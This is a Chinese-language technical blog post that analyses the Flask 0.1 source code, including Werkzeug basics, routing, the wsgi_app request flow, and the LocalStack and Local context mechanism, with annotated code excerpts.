<h1 id="3-3-Werkzeug"><a href="#3-3-Werkzeug" class="headerlink" title="3.3 Werkzeug"></a>3.3 Werkzeug</h1><p>Werkzeug是一个WSGI工具包，官网将其描述为：The Python WSGI Utility Library。<br>一个简单的例子实现一个小的 Hello World 应用。显示用户输入的名字:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> escape</div><div class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Request, Response</div><div class="line"><span class="meta">@Request.application</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(request)</span>:</span></div><div class="line">    result = [<span class="string">'&lt;title&gt;Greeter&lt;/title&gt;'</span>]</div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        result.append(<span class="string">'&lt;h1&gt;Hello %s!&lt;/h1&gt;'</span> % escape(request.form[<span class="string">'name'</span>]))</div><div class="line">    result.append(<span class="string">'''</span></div><div class="line">        &lt;form action="" method="post"&gt;</div><div class="line">            &lt;p&gt;Name: &lt;input type="text" name="name" size="20"&gt;</div><div class="line">            &lt;input type="submit" value="Greet me"&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">    ''')</div><div class="line">    <span class="keyword">return</span> Response(<span class="string">''</span>.join(result), mimet ype=<span class="string">'text/html'</span>)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> run_simple</div><div class="line">    run_simple(<span class="string">'localhost'</span>, <span class="number">8080</span>, hello_world)</div></pre></td></tr></table></figure>
<p>另外不用 request 和 response 对象也可以实现这个功能，那就是借助 werkzeug 提供的 解析函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> werkzeug.formparser <span class="keyword">import</span> parse_form_data</div><div class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> escape</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(environ, start_response)</span>:</span></div><div class="line">    result = [<span class="string">'&lt;title&gt;Greeter&lt;/title&gt;'</span>]</div><div class="line">    <span class="keyword">if</span> environ[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>:</div><div class="line">        form = parse_form_data(environ)[<span class="number">1</span>]</div><div class="line">        result.append(<span class="string">'&lt;h1&gt;Hello %s!&lt;/h1&gt;'</span> % escape(form[<span class="string">'name'</span>]))</div><div class="line">    result.append(<span class="string">'''</span></div><div class="line">        &lt;form action="" method="post"&gt;</div><div class="line">            &lt;p&gt;Name: &lt;input type="text" name="name" size="20"&gt;</div><div class="line">            &lt;input type="submit" value="Greet me"&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">    ''')</div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset=utf-8'</span>)])</div><div class="line">    <span class="keyword">return</span> [<span class="string">''</span>.join(result)]</div></pre></td></tr></table></figure>
<p>通常我们更倾向于使用高级的 API(request 和 response 对象)。但是也有些情况你可能更 想使用低级功能。</p>
<h1 id="4-Flask-0-1源码分析"><a href="#4-Flask-0-1源码分析" class="headerlink" title="4 Flask-0.1源码分析"></a>4 Flask-0.1源码分析</h1><p>有了上面的基础之后，我们可以开始分析Flask的源码了。完整的源码可以参考这里：Flask.py<br>首先我们再来回顾一下Hello World是怎么样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)  </div><div class="line"><span class="meta">@app.route("/")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </div><div class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>先初始化一个Flask的类，然后路由hello方法，最后再run起来。</p>
<h2 id="4-1-Flask-init"><a href="#4-1-Flask-init" class="headerlink" title="4.1 Flask init()"></a>4.1 Flask init()</h2><p>我们来分析一下Flask类的初始化函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flask</span><span class="params">(object)</span>:</span></div><div class="line">    request_class = Request</div><div class="line">    response_class = Response</div><div class="line">    static_path = <span class="string">'/static'</span></div><div class="line">    secret_key = <span class="keyword">None</span></div><div class="line">    session_cookie_name = <span class="string">'session'</span></div><div class="line">    <span class="comment"># 模板参数</span></div><div class="line">    jinja_options = dict(    </div><div class="line">        autoescape=<span class="keyword">True</span>,</div><div class="line">        extensions=[<span class="string">'jinja2.ext.autoescape'</span>, <span class="string">'jinja2.ext.with_'</span>]</div><div class="line">    )</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, package_name)</span>:</span></div><div class="line">        self.debug = <span class="keyword">False</span>                  <span class="comment"># 如果设置为True，则改完code后，服务器会自动部署（reload）  </span></div><div class="line">        self.package_name = package_name    <span class="comment"># __main__        </span></div><div class="line">        self.root_path = _get_package_path(self.package_name)      </div><div class="line">        self.view_functions = &#123;&#125;            <span class="comment"># 保存url视图函数名到函数地址的映射    </span></div><div class="line">        self.error_handlers = &#123;&#125;            <span class="comment"># 保存错误函数，@app.errorhandler(404)...     </span></div><div class="line">        self.before_request_funcs = []      <span class="comment"># 保存request前执行的一些函数，比如打开数据库等     </span></div><div class="line">        self.after_request_funcs = []       <span class="comment"># 保存request后执行的一些函数</span></div><div class="line">        </div><div class="line">        self.template_context_processors = [_default_template_ctx_processor]</div><div class="line">        </div><div class="line">        self.url_map = Map()                </div><div class="line">        </div><div class="line">        <span class="comment"># ???</span></div><div class="line">        <span class="keyword">if</span> self.static_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            self.url_map.add(Rule(self.static_path + <span class="string">'/&lt;filename&gt;'</span>,</div><div class="line">                                  build_only=<span class="keyword">True</span>, endpoint=<span class="string">'static'</span>))</div><div class="line">            <span class="keyword">if</span> pkg_resources <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                target = (self.package_name, <span class="string">'static'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                target = os.path.join(self.root_path, <span class="string">'static'</span>)</div><div class="line">            self.wsgi_app = SharedDataMiddleware(self.wsgi_app, &#123;</div><div class="line">                self.static_path: target</div><div class="line">            &#125;)    </div><div class="line">        self.jinja_env = Environment(loader=self.create_jinja_loader(),</div><div class="line">                                     **self.jinja_options)</div><div class="line">        self.jinja_env.globals.update(</div><div class="line">            url_for=url_for,</div><div class="line">            get_flashed_messages=get_flashed_messages</div><div class="line">        )</div></pre></td></tr></table></figure>
<p>template_context_processors的内容涉及context，这个后面再讲。</p>
<p>self.url_map这个函数保存了URI（访问的后缀URL,比如/，/index/等）到视图函数字典的映射,我们可以看到路由这个函数是如何实现的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rule : URI比如 '\'</span></div><div class="line"><span class="comment"># options : 这里是空的字典 &#123;&#125;，用于后面保存URI对应的访问规则，比如GET or POST，函数名等。</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">route</span><span class="params">(self, rule, **options)</span>:</span></div><div class="line">    <span class="comment"># f指向实际执行的函数地址</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(f)</span>:</span></div><div class="line">        self.add_url_rule(rule, f.__name__, **options)</div><div class="line">        self.view_functions[f.__name__] = f</div><div class="line">        <span class="keyword">return</span> f</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"><span class="comment"># rule : URI</span></div><div class="line"><span class="comment"># endpoint : 函数名字符串</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint, **options)</span>:</span>       </div><div class="line">    options[<span class="string">'endpoint'</span>] = endpoint</div><div class="line">    options.setdefault(<span class="string">'methods'</span>, (<span class="string">'GET'</span>,))</div><div class="line">    self.url_map.add(Rule(rule, **options))</div></pre></td></tr></table></figure>
<p>假如我们写了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">app.route(&apos;/&apos;)</div><div class="line">def hello():</div><div class="line">    print(&apos;hello shun.&apos;)</div></pre></td></tr></table></figure>
<p>相当于执行了:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hello = app.route(<span class="string">'/'</span>)(hello)</div></pre></td></tr></table></figure>
<p>对装饰器不太熟悉的同学，可以参考我的另外一篇文章:<a href="http://maoao530.github.io/2016/05/17/python-decorator/">Python 装饰器decorator</a></p>
<h2 id="4-2-wsgi-app"><a href="#4-2-wsgi-app" class="headerlink" title="4.2 wsgi_app"></a>4.2 wsgi_app</h2><p>当我们执行app.run函数的时候,最终会执行到wsgi_app函数，这个函数是Flask的入口核心函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">app.run()</div><div class="line">    run_simple(host, port, self, **options)</div><div class="line">        __call__(self, environ, start_response)</div><div class="line">            wsgi_app(self, environ, start_response)</div></pre></td></tr></table></figure>
<p>最终会执行wsgi_app，这个函数是flask的入口，也是核心：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wsgi_app</span><span class="params">(self, environ, start_response)</span>:</span></div><div class="line">    <span class="keyword">with</span> self.request_context(environ):         <span class="comment"># 创建request context</span></div><div class="line">        rv = self.preprocess_request()          <span class="comment"># 先调用预处理函数</span></div><div class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:        </div><div class="line">            rv = self.dispatch_request()        <span class="comment"># 分发请求</span></div><div class="line">        response = self.make_response(rv)       <span class="comment"># </span></div><div class="line">        response = self.process_response(response)</div><div class="line">        <span class="keyword">return</span> response(environ, start_response)</div></pre></td></tr></table></figure>
<h3 id="4-2-1-生成request-context"><a href="#4-2-1-生成request-context" class="headerlink" title="4.2.1 生成request_context"></a>4.2.1 生成request_context</h3><p>我们一个一个来分析，先看是如何创建request context的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Flask类函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_context</span><span class="params">(self, environ)</span>:</span></div><div class="line">        <span class="keyword">return</span> _RequestContext(self, environ)</div><div class="line"><span class="comment"># _RequestContext类</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">_RequestContext</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, app, environ)</span>:</span></div><div class="line">        self.app = app                                           <span class="comment"># Flask app</span></div><div class="line">        self.url_adapter = app.url_map.bind_to_environ(environ)  <span class="comment"># 将ENV绑定到URL Adappter，可以参考werkzeug相关文档说明</span></div><div class="line">        self.request = app.request_class(environ)                <span class="comment"># app.request = Request类，其实就是把environ字典的一些信息封装为Request对象</span></div><div class="line">        self.session = app.open_session(self.request)            <span class="comment"># 从cookie中拿到sessionID，然后读取用户的session</span></div><div class="line">        self.g = _RequestGlobals()                               </div><div class="line">        self.flashes = <span class="keyword">None</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></div><div class="line">        _request_ctx_stack.push(self)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_type, exc_value, tb)</span>:</span></div><div class="line">        <span class="keyword">if</span> tb <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> <span class="keyword">not</span> self.app.debug:</div><div class="line">            _request_ctx_stack.pop()</div></pre></td></tr></table></figure>
<p>URL Adappter更多，可以点击这里 : <a href="http://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/tutorial.html#step-4" target="_blank" rel="external">Werkzeug 文档说明</a></p>
<p>关于Session和Cookie，我这里多补充几句：</p>
<ol>
<li>Session是在服务端保存的一个数据结构，用来对用户会话进行跟踪的一个机制，根据不同的Session ID来标识不同的用户，这个数据可以保存在集群、数据库、文件中。常见的使用场景，比如购物车等。</li>
<li>Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。</li>
<li>Session ID一般是存在Cookie中，所以如果浏览器禁用了Cookie，同时Session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id）</li>
</ol>
<h3 id="4-2-2-预处理preprocess-request"><a href="#4-2-2-预处理preprocess-request" class="headerlink" title="4.2.2 预处理preprocess_request"></a>4.2.2 预处理preprocess_request</h3><p>我们再来看看先调用预处理函数preprocess_request：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_request</span><span class="params">(self)</span>:</span> </div><div class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> self.before_request_funcs:  </div><div class="line">        rv = func()</div><div class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:  </div><div class="line">            <span class="comment"># 如果这些函数中有返回值，则被视为来自试图的返回值，并停止其他函数处理</span></div><div class="line">            <span class="comment"># 预处理函数应当不需要有返回值的，这点需注意</span></div><div class="line">            <span class="keyword">return</span> rv</div></pre></td></tr></table></figure>
<p>会遍历before_request_funcs这个列表的函数并且执行，这个列表函数通过装饰器@app.before_request来赋值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">(self, f)</span>:</span></div><div class="line">    <span class="string">"""Registers a function to run before each request."""</span></div><div class="line">    self.before_request_funcs.append(f)</div><div class="line">    <span class="keyword">return</span> f</div></pre></td></tr></table></figure>
<h3 id="4-2-3-分发请求dispatch-request"><a href="#4-2-3-分发请求dispatch-request" class="headerlink" title="4.2.3 分发请求dispatch_request()"></a>4.2.3 分发请求dispatch_request()</h3><p>简单一句话，这个函数的作用就是匹配到Request对应的URL和视图函数，并执行这个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">match_request</span><span class="params">(self)</span>:</span></div><div class="line">    rv = _request_ctx_stack.top.url_adapter.match()  <span class="comment"># self.url_adapter 上文有说明</span></div><div class="line">    <span class="comment"># endpoint 是指函数名</span></div><div class="line">    <span class="comment"># view_args 这里是一个dict，视图参数？？</span></div><div class="line">    request.endpoint, request.view_args = rv         </div><div class="line">    <span class="keyword">return</span> rv</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch_request</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        endpoint, values = self.match_request()         <span class="comment"># 先匹配函数名和参数</span></div><div class="line">        <span class="keyword">return</span> self.view_functions[endpoint](**values)  <span class="comment"># 匹配完后直接执行函数</span></div><div class="line">    </div><div class="line">    <span class="keyword">except</span> HTTPException, e:                            <span class="comment"># 匹配不到视图函数的处理</span></div><div class="line">        handler = self.error_handlers.get(e.code)</div><div class="line">        <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> e</div><div class="line">        <span class="keyword">return</span> handler(e)</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        handler = self.error_handlers.get(<span class="number">500</span>)</div><div class="line">        <span class="keyword">if</span> self.debug <span class="keyword">or</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">raise</span></div><div class="line">        <span class="keyword">return</span> handler(e)</div></pre></td></tr></table></figure>
<h3 id="4-2-4-生成response对象"><a href="#4-2-4-生成response对象" class="headerlink" title="4.2.4 生成response对象"></a>4.2.4 生成response对象</h3><p>生成一个response对象，并返回：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ResponseBase由Werkzeug提供,</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(ResponseBase)</span>:</span></div><div class="line">    default_mimetype = <span class="string">'text/html'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response</span><span class="params">(self, rv)</span>:</span>       </div><div class="line">    <span class="keyword">if</span> isinstance(rv, self.response_class):</div><div class="line">        <span class="keyword">return</span> rv</div><div class="line">    <span class="keyword">if</span> isinstance(rv, basestring):</div><div class="line">        <span class="keyword">return</span> self.response_class(rv)</div><div class="line">    <span class="keyword">if</span> isinstance(rv, tuple):</div><div class="line">        <span class="keyword">return</span> self.response_class(*rv)</div><div class="line">    <span class="keyword">return</span> self.response_class.force_type(rv, request.environ)</div></pre></td></tr></table></figure>
<p>如果不是response对象，则转化response对象，response对象继承自ResponseBase对象，其实就是Response对象。<br>若需要进一步了解，可以访问：<a href="http://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/quickstart.html#response" target="_blank" rel="external">http://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/quickstart.html#response</a></p>
<h3 id="4-2-5-self-process-response-response"><a href="#4-2-5-self-process-response-response" class="headerlink" title="4.2.5 self.process_response(response)"></a>4.2.5 self.process_response(response)</h3><p>生成response对象后，保存session并执行一些request后的函数，最后再返回response对象：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, response)</span>:</span>   </div><div class="line">    session = _request_ctx_stack.top.session  <span class="comment"># 从RequestContext中拿到用户的session</span></div><div class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        self.save_session(session, response)  <span class="comment"># 保存session</span></div><div class="line">    <span class="keyword">for</span> handler <span class="keyword">in</span> self.after_request_funcs:  </div><div class="line">        response = handler(response)          <span class="comment"># 执行装饰器 @app.after_request 标记的函数</span></div><div class="line">    <span class="keyword">return</span> response                           <span class="comment"># 最后返回response对象</span></div></pre></td></tr></table></figure>
<p>在所有都处理完成后，把需要返回的内容返回给客户端：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> response(environ, start_response)</div></pre></td></tr></table></figure>
<p>至此，flask 0.1主框架大致分析完成了。</p>
<h1 id="5-Flask-Context机制"><a href="#5-Flask-Context机制" class="headerlink" title="5 Flask Context机制"></a>5 Flask Context机制</h1><p>细心的同学在上面应该注意到了，我们还有一个点没有讲，那就是Flask的Context机制。</p>
<p>Flask 中有分为请求上下文和应用上下文：</p>
<table>
<thead>
<tr>
<th>对象</th>
<th>Context类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>current_app</td>
<td>AppContext</td>
<td>当前应用的对象</td>
</tr>
<tr>
<td>g</td>
<td>AppContext</td>
<td>处理请求时用作临时存储的对象</td>
</tr>
<tr>
<td>request</td>
<td>RequestContext</td>
<td>请求request对象</td>
</tr>
<tr>
<td>session</td>
<td>RequestContext</td>
<td>请求的session对象</td>
</tr>
</tbody>
</table>
<p>拉到Flask.py最后面，我们可以看到有以下几行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">_request_ctx_stack = LocalStack()</div><div class="line">current_app = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.app)</div><div class="line">request = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.request)</div><div class="line">session = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.session)</div><div class="line">g = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.g)</div></pre></td></tr></table></figure>
<p>所有的对象都交由request_ctx_stack这个堆栈来管理了。</p>
<h2 id="5-1-LocakStack"><a href="#5-1-LocakStack" class="headerlink" title="5.1 LocakStack()"></a>5.1 LocakStack()</h2><p>LocalStack()会返回一个栈。栈肯定会有push 、pop和top函数，如下所示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalStack</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">        &gt;&gt;&gt; ls = LocalStack()</div><div class="line">        &gt;&gt;&gt; ls.push(42)</div><div class="line">        &gt;&gt;&gt; ls.top</div><div class="line">        42</div><div class="line">        &gt;&gt;&gt; ls.push(23)</div><div class="line">        &gt;&gt;&gt; ls.top</div><div class="line">        23</div><div class="line">        &gt;&gt;&gt; ls.pop()</div><div class="line">        23</div><div class="line">        &gt;&gt;&gt; ls.top</div><div class="line">        42</div><div class="line">    """</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self._local = Local()</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, obj)</span>:</span></div><div class="line">        rv = getattr(self._local, <span class="string">'stack'</span>, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            self._local.stack = rv = []</div><div class="line">        rv.append(obj)</div><div class="line">        <span class="keyword">return</span> rv</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        stack = getattr(self._local, <span class="string">'stack'</span>, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">if</span> stack <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">elif</span> len(stack) == <span class="number">1</span>:</div><div class="line">            release_local(self._local)</div><div class="line">            <span class="keyword">return</span> stack[<span class="number">-1</span>]</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> stack.pop()</div><div class="line"><span class="meta">    @property</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self._local.stack[<span class="number">-1</span>]</div><div class="line">        <span class="keyword">except</span> (AttributeError, IndexError):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>按照我们的理解，要实现一个栈，那么LocalStack类应该有一个成员变量，是一个list，然后通过 这个list来保存栈的元素。然而，LocalStack并没有一个类型是list的成员变量， LocalStack仅有一个成员变量self._local = Local()。</p>
<p>我们再看push，pop，top函数可以知道，具体是通过self._local.stack这个来实现栈的操作。</p>
<h2 id="5-2-Local"><a href="#5-2-Local" class="headerlink" title="5.2 Local()"></a>5.2 Local()</h2><p>当我们操作self._local.stack时，会调用Local()的getattr和setattr方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span><span class="params">(object)</span>:</span></div><div class="line">    __slots__ = (<span class="string">'__storage__'</span>, <span class="string">'__ident_func__'</span>)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        object.__setattr__(self, <span class="string">'__storage__'</span>, &#123;&#125;)</div><div class="line">        object.__setattr__(self, <span class="string">'__ident_func__'</span>, get_ident)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self.__storage__[self.__ident_func__()][name]</div><div class="line">        <span class="keyword">except</span> KeyError:</div><div class="line">            <span class="keyword">raise</span> AttributeError(name)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></div><div class="line">        ident = self.__ident_func__()</div><div class="line">        storage = self.__storage__</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            storage[ident][name] = value</div><div class="line">        <span class="keyword">except</span> KeyError:</div><div class="line">            storage[ident] = &#123;name: value&#125;</div></pre></td></tr></table></figure>
<p>Local类有两个成员变量，分别是storage和ident_func，其中，前者 是一个字典，后者是一个函数。<br>这个函数的含义是，获取当前线程的id。</p>
<p>例如，当我们执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">request_ctx_stack = LocalStack()</div><div class="line">_request_ctx_stack.push(RequestContext)</div></pre></td></tr></table></figure>
<p>注意，这里赋值的时候，最终会调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># name =&gt; stack</span></div><div class="line">self.__storage__[self.__ident_func__()][name] = RequestContext</div></pre></td></tr></table></figure>
